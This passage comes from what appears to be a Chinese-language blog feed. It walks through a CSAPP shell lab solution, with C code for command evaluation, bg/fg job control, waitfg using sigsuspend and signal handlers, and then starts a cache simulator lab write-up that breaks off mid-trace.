class="hljs-number">0</span>)<br>        unix_error(<span class="hljs-string">&quot;Fork error&quot;</span>);<br>    <span class="hljs-keyword">return</span> pid;<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">Sigprocmask</span><span class="hljs-params">(<span class="hljs-type">int</span> how, <span class="hljs-type">const</span> <span class="hljs-type">sigset_t</span> *<span class="hljs-built_in">set</span>, <span class="hljs-type">sigset_t</span> *oldset)</span>&#123;<br>    <span class="hljs-keyword">if</span>(sigprocmask(how, <span class="hljs-built_in">set</span>, oldset) &lt; <span class="hljs-number">0</span>)<br>        unix_error(<span class="hljs-string">&quot;Sigprocmask error&quot;</span>);<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">Sigemptyset</span><span class="hljs-params">(<span class="hljs-type">sigset_t</span> *<span class="hljs-built_in">set</span>)</span>&#123;<br>    <span class="hljs-keyword">if</span>(sigemptyset(<span class="hljs-built_in">set</span>) &lt; <span class="hljs-number">0</span>)<br>        unix_error(<span class="hljs-string">&quot;Sigprocmask error&quot;</span>);<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">Sigfillset</span><span class="hljs-params">(<span class="hljs-type">sigset_t</span> *<span class="hljs-built_in">set</span>)</span>&#123;<br>    <span class="hljs-keyword">if</span>(sigfillset(<span class="hljs-built_in">set</span>) &lt; <span class="hljs-number">0</span>)<br>        unix_error(<span class="hljs-string">&quot;Sigfillset error&quot;</span>);<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">Sigaddset</span><span class="hljs-params">(<span class="hljs-type">sigset_t</span> *<span class="hljs-built_in">set</span>, <span class="hljs-type">int</span> signum)</span>&#123;<br>    <span class="hljs-keyword">if</span>(sigaddset(<span class="hljs-built_in">set</span>, signum) &lt; <span class="hljs-number">0</span>)<br>        unix_error(<span class="hljs-string">&quot;Sigaddset error&quot;</span>);<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">Execve</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *filename, <span class="hljs-type">char</span> *<span class="hljs-type">const</span> argv[], <span class="hljs-type">char</span> *<span class="hljs-type">const</span> envp[])</span>&#123;<br>    <span class="hljs-keyword">if</span>(execve(filename, argv, envp) &lt; <span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s: Command not found.\n&quot;</span>, argv[<span class="hljs-number">0</span>]);<br>    &#125;<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">Setpgid</span><span class="hljs-params">(<span class="hljs-type">pid_t</span> pid, <span class="hljs-type">pid_t</span> pgid)</span>&#123;<br>    <span class="hljs-keyword">if</span>(setpgid(pid, pgid) &lt; <span class="hljs-number">0</span>)&#123;<br>        unix_error(<span class="hljs-string">&quot;Setpid error&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">Kill</span><span class="hljs-params">(<span class="hljs-type">pid_t</span> pid, <span class="hljs-type">int</span> sig)</span>&#123;<br>    <span class="hljs-keyword">if</span>(kill(pid, sig) &lt; <span class="hljs-number">0</span>)&#123;<br>        unix_error(<span class="hljs-string">&quot;Kill error&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h3><p>解析命令行，判断其是内置命令，还是程序路径，分别执行，如果是前台作业，要等待其完成，如果是后台作业，则要输出其相应信息</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * eval - Evaluate the command line that the user has just typed in</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * If the user has requested a built-in command (quit, jobs, bg or fg)</span><br><span class="hljs-comment"> * then execute it immediately. Otherwise, fork a child process and</span><br><span class="hljs-comment"> * run the job in the context of the child. If the job is running in</span><br><span class="hljs-comment"> * the foreground, wait for it to terminate and then return.  Note:</span><br><span class="hljs-comment"> * each child process must have a unique process group ID so that our</span><br><span class="hljs-comment"> * background children don&#x27;t receive SIGINT (SIGTSTP) from the kernel</span><br><span class="hljs-comment"> * when we type ctrl-c (ctrl-z) at the keyboard.  </span><br><span class="hljs-comment">*/</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">eval</span><span class="hljs-params">(<span class="hljs-type">char</span> *cmdline)</span> <br>&#123;<br>    <span class="hljs-type">char</span> *argv[MAXARGS];        <span class="hljs-comment">//存放解析的参数</span><br>    <span class="hljs-type">char</span> buf[MAXLINE];          <span class="hljs-comment">//解析cmdline</span><br>    <span class="hljs-type">int</span> bg;                     <span class="hljs-comment">//判断程序是前台还是后台执行</span><br>    <span class="hljs-type">int</span> state;                  <span class="hljs-comment">//指示前台还是后台运行状态</span><br>    <span class="hljs-type">pid_t</span> pid;                  <span class="hljs-comment">//执行程序的子进程的pid</span><br><br>    <span class="hljs-built_in">strcpy</span>(buf, cmdline);   <br>    bg = parseline(buf, argv);  <span class="hljs-comment">//解析参数</span><br>    state = bg? BG:FG;          <br>    <span class="hljs-keyword">if</span>(argv[<span class="hljs-number">0</span>] == <span class="hljs-literal">NULL</span>)         <span class="hljs-comment">//空行，直接返回</span><br>        <span class="hljs-keyword">return</span>;<br>    <span class="hljs-type">sigset_t</span> mask_all, mask_one, prev_one;<br>    Sigfillset(&amp;mask_all);<br>    Sigemptyset(&amp;mask_one);<br>    Sigaddset(&amp;mask_one, SIGCHLD);<br>    <span class="hljs-keyword">if</span>(!builtin_cmd(argv)) &#123;                            <span class="hljs-comment">//判断是否为内置命令</span><br>        Sigprocmask(SIG_BLOCK, &amp;mask_one, &amp;prev_one);       <span class="hljs-comment">//fork前阻塞SIGCHLD信号</span><br>        <span class="hljs-keyword">if</span>((pid = Fork()) == <span class="hljs-number">0</span>) &#123;                           <span class="hljs-comment">//创建子进程</span><br>            Sigprocmask(SIG_SETMASK, &amp;prev_one, <span class="hljs-literal">NULL</span>);      <span class="hljs-comment">//解除子进程的阻塞</span><br>            Setpgid(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>);                                  <span class="hljs-comment">//创建新进程组，ID设置为进程PID</span><br>            Execve(argv[<span class="hljs-number">0</span>], argv, environ);                 <span class="hljs-comment">//执行</span><br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);                                        <span class="hljs-comment">//子线程执行完毕后一定要退出</span><br>        &#125;<br>        <span class="hljs-keyword">if</span>(state==FG)&#123;<br>            Sigprocmask(SIG_BLOCK, &amp;mask_all, <span class="hljs-literal">NULL</span>);            <span class="hljs-comment">//添加工作前阻塞所有信号</span><br>            addjob(jobs, pid, state, cmdline);                  <span class="hljs-comment">//添加至作业列表</span><br>            Sigprocmask(SIG_SETMASK, &amp;mask_one, <span class="hljs-literal">NULL</span>);<br>            waitfg(pid);                                        <span class="hljs-comment">//等待前台进程执行完毕</span><br>        &#125;         <br>        <span class="hljs-keyword">else</span>&#123;<br>            Sigprocmask(SIG_BLOCK, &amp;mask_all, <span class="hljs-literal">NULL</span>);            <span class="hljs-comment">//添加工作前阻塞所有信号</span><br>            addjob(jobs, pid, state, cmdline);                  <span class="hljs-comment">//添加至作业列表</span><br>            Sigprocmask(SIG_SETMASK, &amp;mask_one, <span class="hljs-literal">NULL</span>);                                 <br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[%d] (%d) %s&quot;</span>,pid2jid(pid), pid, cmdline);  <span class="hljs-comment">//打印后台进程信息</span><br>        &#125;<br>        Sigprocmask(SIG_SETMASK, &amp;prev_one, <span class="hljs-literal">NULL</span>);          <span class="hljs-comment">//解除阻塞 </span><br>    &#125;<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="builtin-cmd"><a href="#builtin-cmd" class="headerlink" title="builtin_cmd"></a>builtin_cmd</h3><p>判断是否为内置命令</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * builtin_cmd - If the user has typed a built-in command then execute</span><br><span class="hljs-comment"> *    it immediately.  </span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">builtin_cmd</span><span class="hljs-params">(<span class="hljs-type">char</span> **argv)</span> <br>&#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(argv[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;quit&quot;</span>))<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(argv[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;bg&quot;</span>) || !<span class="hljs-built_in">strcmp</span>(argv[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;fg&quot;</span>)) &#123;<br>        do_bgfg(argv);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(argv[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;jobs&quot;</span>)) &#123;<br>        listjobs(jobs);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(argv[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;&amp;&quot;</span>))<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;     <span class="hljs-comment">/* not a builtin command */</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="do-bgfg"><a href="#do-bgfg" class="headerlink" title="do_bgfg"></a>do_bgfg</h3><p>实现内置命令bg和fg，这两个命令的功能如下：</p><ul><li><code>bg &lt;job&gt;</code>：通过向<code>&lt;job&gt;</code>对应的作业发送<code>SIGCONT</code>信号来使它重启并放在后台运行</li><li><code>fg &lt;job&gt;</code>：通过向 <code>&lt;job&gt;</code>对应的作业发送<code>SIGCONT</code>信号来使它重启并放在前台运行</li><li>输入时后面的参数有<code>%</code>则代表<code>jid</code>，没有则代表<code>pid</code></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * do_bgfg - Execute the builtin bg and fg commands</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">do_bgfg</span><span class="hljs-params">(<span class="hljs-type">char</span> **argv)</span> <br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">job_t</span> *<span class="hljs-title">job</span> =</span> <span class="hljs-literal">NULL</span>;        <span class="hljs-comment">//要处理的job</span><br>    <span class="hljs-type">int</span> state;                      <span class="hljs-comment">//输入的命令</span><br>    <span class="hljs-type">int</span> id;                         <span class="hljs-comment">//存储jid或pid</span><br>    <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">strcmp</span>(argv[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;bg&quot;</span>)) state = BG;<br>        <span class="hljs-keyword">else</span> state = FG;  <br>    <span class="hljs-keyword">if</span>(argv[<span class="hljs-number">1</span>]==<span class="hljs-literal">NULL</span>)&#123;               <span class="hljs-comment">//没带参数</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s command requires PID or %%jobid argument\n&quot;</span>, argv[<span class="hljs-number">0</span>]);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(argv[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>]==<span class="hljs-string">&#x27;%&#x27;</span>)&#123;             <span class="hljs-comment">//说明是jid</span><br>       <span class="hljs-keyword">if</span>(<span class="hljs-built_in">sscanf</span>(&amp;argv[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>], <span class="hljs-string">&quot;%d&quot;</span>, &amp;id) &gt; <span class="hljs-number">0</span>)&#123;<br>            job = getjobjid(jobs, id);  <span class="hljs-comment">//获得job</span><br>            <span class="hljs-keyword">if</span>(job==<span class="hljs-literal">NULL</span>)&#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%%%d: No such job\n&quot;</span>, id);<br>                <span class="hljs-keyword">return</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">isdigit</span>(argv[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>])) &#123;  <span class="hljs-comment">//其它符号，非法输入</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s: argument must be a PID or %%jobid\n&quot;</span>, argv[<span class="hljs-number">0</span>]);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;                       <span class="hljs-comment">//pid</span><br>        id = atoi(argv[<span class="hljs-number">1</span>]);<br>        job = getjobpid(jobs, id);<br>        <span class="hljs-keyword">if</span>(job==<span class="hljs-literal">NULL</span>)&#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;(%d): No such process\n&quot;</span>, id);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br><br>    &#125;<br>    Kill(-(job-&gt;pid), SIGCONT);       <span class="hljs-comment">//重启进程, 这里发送到进程组</span><br>    job-&gt;state = state;<br>    <span class="hljs-keyword">if</span>(state==BG)<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[%d] (%d) %s&quot;</span>,job-&gt;jid, job-&gt;pid, job-&gt;cmdline);<br>    <span class="hljs-keyword">else</span> <br>        waitfg(job-&gt;pid);<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="waitfg"><a href="#waitfg" class="headerlink" title="waitfg"></a>waitfg</h3><p>该函数从要求实现阻塞父进程，直到当前的前台进程不再是前台进程了。这里显然要显式的等待信号</p><p>解决方法是用sleep函数或sigsuspend函数，该函数相当于</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">sigprocmask(SIG_SETMASK, &amp;mask, &amp;prev);<br>pause();<br>sigprocmask(SIG_SETMASK, &amp;prev, <span class="hljs-literal">NULL</span>);<br></code></pre></td></tr></table></figure><p>在调用<code>sigsuspend</code>之前阻塞 SIGCHLD 信号，调用时又通过<code>sigprocmask</code>函数，在执行<code>pause</code>函数之前解除对信号的阻塞，从而正常休眠。有同学可能会问了：这里并没有消除竞争啊？如果在第 1 行和第 2 行之间子进程终止不还是会发生永久休眠吗？</p><p>这就是<code>sigsuspend</code>与上述代码的不同之处了，它相当于上述代码的原子版本，即第 1 行和第 2 行总是一起发生的，不会被中断！</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * waitfg - Block until process pid is no longer the foreground process</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">waitfg</span><span class="hljs-params">(<span class="hljs-type">pid_t</span> pid)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">sigset_t</span> mask;<br>    <span class="hljs-built_in">Sigemptyset</span>(&amp;mask);   <br>    <span class="hljs-keyword">while</span> (<span class="hljs-built_in">fgpid</span>(jobs) != <span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-built_in">sigsuspend</span>(&amp;mask);      <span class="hljs-comment">//暂停时取消阻塞,见sigsuspend用法</span><br>    &#125;<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="信号处理函数"><a href="#信号处理函数" class="headerlink" title="信号处理函数"></a>信号处理函数</h3><h4 id="sigchld-handler"><a href="#sigchld-handler" class="headerlink" title="sigchld_handler"></a>sigchld_handler</h4><p>回收所有僵死进程</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * sigchld_handler - The kernel sends a SIGCHLD to the shell whenever</span><br><span class="hljs-comment"> *     a child job terminates (becomes a zombie), or stops because it</span><br><span class="hljs-comment"> *     received a SIGSTOP or SIGTSTP signal. The handler reaps all</span><br><span class="hljs-comment"> *     available zombie children, but doesn&#x27;t wait for any other</span><br><span class="hljs-comment"> *     currently running children to terminate.  </span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">sigchld_handler</span><span class="hljs-params">(<span class="hljs-type">int</span> sig)</span> <br>&#123;<br>    <span class="hljs-type">int</span> olderrno = errno;   <span class="hljs-comment">//由于errno是全局变量,注意保存和恢复errno</span><br>    <span class="hljs-type">int</span> status;<br>    <span class="hljs-type">pid_t</span> pid;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">job_t</span> *<span class="hljs-title">job</span>;</span><br>    <span class="hljs-type">sigset_t</span> mask, prev;<br>    sigfillset(&amp;mask);<br>    <span class="hljs-keyword">while</span> ((pid = waitpid(<span class="hljs-number">-1</span>, &amp;status, WNOHANG | WUNTRACED)) &gt; <span class="hljs-number">0</span>)&#123;      <span class="hljs-comment">//立即返回该子进程的pid</span><br>        sigprocmask(SIG_BLOCK, &amp;mask, &amp;prev);   <span class="hljs-comment">//阻塞所有信号</span><br>        <span class="hljs-keyword">if</span> (WIFEXITED(status))&#123;                 <span class="hljs-comment">//正常终止</span><br>            deletejob(jobs, pid);<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (WIFSIGNALED(status))&#123;          <span class="hljs-comment">//因为信号而终止, 打印</span><br>            <span class="hljs-built_in">printf</span> (<span class="hljs-string">&quot;Job [%d] (%d) terminated by signal %d\n&quot;</span>, pid2jid(pid), pid, WTERMSIG(status));<br>            deletejob(jobs, pid);<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (WIFSTOPPED(status))&#123;           <span class="hljs-comment">//因为信号而停止, 打印</span><br>            <span class="hljs-built_in">printf</span> (<span class="hljs-string">&quot;Job [%d] (%d) stoped by signal %d\n&quot;</span>, pid2jid(pid), pid, WSTOPSIG(status));<br>            job = getjobpid(jobs, pid);<br>            job-&gt;state = ST;<br>        &#125;<br>        sigprocmask(SIG_SETMASK, &amp;prev, <span class="hljs-literal">NULL</span>);          <br>    &#125;<br>    errno = olderrno;<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="sigint-handler"><a href="#sigint-handler" class="headerlink" title="sigint_handler"></a>sigint_handler</h5><p>实现一个SIGINT信号处理函数，将信号传给前台程序</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * sigint_handler - The kernel sends a SIGINT to the shell whenver the</span><br><span class="hljs-comment"> *    user types ctrl-c at the keyboard.  Catch it and send it along</span><br><span class="hljs-comment"> *    to the foreground job.  </span><br><span class="hljs-comment"> */</span><br>void sigint<span class="hljs-constructor">_handler(<span class="hljs-params">int</span> <span class="hljs-params">sig</span>)</span> <br>&#123;<br>    <span class="hljs-built_in">int</span> olderrno = errno;<br>    <span class="hljs-built_in">int</span> pid;<br>    sigset_t mask_all, prev;<br>    <span class="hljs-constructor">Sigfillset(&amp;<span class="hljs-params">mask_all</span>)</span>;<br>    <span class="hljs-constructor">Sigprocmask(SIG_BLOCK, &amp;<span class="hljs-params">mask_all</span>, &amp;<span class="hljs-params">prev</span>)</span>;   <span class="hljs-comment">//jobs为全局变量</span><br>    <span class="hljs-keyword">if</span>((pid = fgpid(jobs)) != <span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-constructor">Sigprocmask(SIG_SETMASK, &amp;<span class="hljs-params">prev</span>, NULL)</span>;<br>        <span class="hljs-constructor">Kill(-<span class="hljs-params">pid</span>, SIGINT)</span>;<br>    &#125;<br>    errno = olderrno;<br>    return;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="sigstp-handler"><a href="#sigstp-handler" class="headerlink" title="sigstp_handler"></a>sigstp_handler</h4><p>实现一个SIGSTOP信号处理函数，将信号传给前台程序</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * sigtstp_handler - The kernel sends a SIGTSTP to the shell whenever</span><br><span class="hljs-comment"> *     the user types ctrl-z at the keyboard. Catch it and suspend the</span><br><span class="hljs-comment"> *     foreground job by sending it a SIGTSTP.  </span><br><span class="hljs-comment"> */</span><br>void sigtstp<span class="hljs-constructor">_handler(<span class="hljs-params">int</span> <span class="hljs-params">sig</span>)</span> <br>&#123;<br>     <span class="hljs-built_in">int</span> olderrno = errno;<br>    <span class="hljs-built_in">int</span> pid;<br>    sigset_t mask_all, prev;<br>    <span class="hljs-constructor">Sigfillset(&amp;<span class="hljs-params">mask_all</span>)</span>;<br>    <span class="hljs-constructor">Sigprocmask(SIG_BLOCK, &amp;<span class="hljs-params">mask_all</span>, &amp;<span class="hljs-params">prev</span>)</span>;<br>    <span class="hljs-keyword">if</span>((pid = fgpid(jobs)) &gt; <span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-constructor">Sigprocmask(SIG_SETMASK, &amp;<span class="hljs-params">prev</span>, NULL)</span>;<br>        <span class="hljs-constructor">Kill(-<span class="hljs-params">pid</span>, SIGSTOP)</span>;<br>    &#125;<br>    errno = olderrno;<br>    return;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h3><p><img src="https://cdn.jsdelivr.net/gh/htwzxwj/image@main/202401181739389.png" alt="test16"></p><p><img src="https://cdn.jsdelivr.net/gh/htwzxwj/image@main/202401181740032.png" alt="test15"></p><p><img src="https://cdn.jsdelivr.net/gh/htwzxwj/image@main/202401181740304.png" alt="test14"></p><p>左边参考 右边自己实现</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li>从未想过每天都在使用的shell需要考虑这么多：回收进程、竞争避免等</li><li>第一次接触并行并发的概念，希望能再厉害一点点</li></ul>]]></content>
    
    
    <categories>
      
      <category>CSAPP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>shell</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>csapp cash_lab</title>
    <link href="/2023/11/17/csapp-cash-lab/"/>
    <url>/2023/11/17/csapp-cash-lab/</url>
    
    <content type="html"><![CDATA[<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>csapp 3e 第6章</p><h2 id="Part-A-Writing-a-Cache-Simulator"><a href="#Part-A-Writing-a-Cache-Simulator" class="headerlink" title="Part A: Writing a Cache Simulator"></a>Part A: Writing a Cache Simulator</h2><p>In Part A you will write a cache simulator in <code>csim.c</code> that takes a <code>valgrind</code> memory trace as input, simulates the hit&#x2F;miss behavior of a cache memory on this trace, and outputs the total number of hits, misses, and evictions.</p><p>要求编写cache模拟器，模拟cache在这个trace的hit&#x2F;miss表现，并输出hit miss evictions的总数</p><p>lab给出了可供参考的cache模拟器，其有以下六个参数</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs vim">Usage: ./csim-ref [-hv] -s <span class="hljs-symbol">&lt;s&gt;</span> -E <span class="hljs-symbol">&lt;E&gt;</span> -<span class="hljs-keyword">b</span> <span class="hljs-symbol">&lt;b&gt;</span> -t <span class="hljs-symbol">&lt;tracefile&gt;</span><br>• -h: Optional <span class="hljs-keyword">help</span> flag that prints usage info<br>• -v: Optional <span class="hljs-keyword">verbose</span> flag that displays trace info<br>• -s <span class="hljs-symbol">&lt;s&gt;</span>: Number of <span class="hljs-keyword">set</span> <span class="hljs-built_in">index</span> bits (S = <span class="hljs-number">2</span>^s <span class="hljs-keyword">is</span> the <span class="hljs-keyword">number</span> of sets)<br>• -E <span class="hljs-symbol">&lt;E&gt;</span>: Associativity (<span class="hljs-keyword">number</span> of lines per <span class="hljs-keyword">set</span>)<br>• -<span class="hljs-keyword">b</span> <span class="hljs-symbol">&lt;b&gt;</span>: Number of block bits (B = <span class="hljs-number">2</span>^<span class="hljs-keyword">b</span> <span class="hljs-keyword">is</span> the block size)<br>• -t <span class="hljs-symbol">&lt;tracefile&gt;</span>: Name of the valgrind trace <span class="hljs-keyword">to</span> replay<br></code></pre></td></tr></table></figure><p>trace文件夹包含了用于评估模拟器的trace文件，其使用<code>valgrind</code>生成</p><p>trace文件中具体定义为</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">I</span> <span class="hljs-number">0400</span>d7d4,<span class="hljs-number">8</span><br><span class="hljs-attribute">M</span> <span 